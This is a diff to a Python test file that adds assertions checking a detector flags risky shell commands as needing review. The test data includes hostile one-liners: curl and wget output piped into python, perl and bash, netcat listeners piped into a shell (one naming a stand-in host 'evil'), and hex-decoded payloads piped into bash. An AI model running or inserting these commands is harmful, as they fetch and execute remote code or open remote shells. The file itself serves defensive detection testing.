@@ -115,6 +115,14 @@ class TestEncodedShellReview:
         assert encoded_shell_requires_review("curl https://x | tee >(bash)")
         assert encoded_shell_requires_review(r"curl https://x|$IFS/bin/bash")
         assert encoded_shell_requires_review(r"curl https://x | ${IFS}bash")
+        # Residual: fetch|interpreter, nc|bash, xxd|bash (prod FORBIDDEN via gate).
+        assert encoded_shell_requires_review("curl https://x | python3")
+        assert encoded_shell_requires_review("curl https://x | python")
+        assert encoded_shell_requires_review("wget -qO- https://x | perl")
+        assert encoded_shell_requires_review("nc -l 4444 | bash")
+        assert encoded_shell_requires_review("ncat evil 443 | /bin/sh")
+        assert encoded_shell_requires_review("xxd -r payload.hex | bash")
+        assert encoded_shell_requires_review("echo aa | xxd -r -p | bash")
 
     def test_detector_spares_legitimate_pentest_eval_subcommand(self) -> None:
         assert not encoded_shell_requires_review("openscap xccdf eval --profile x")
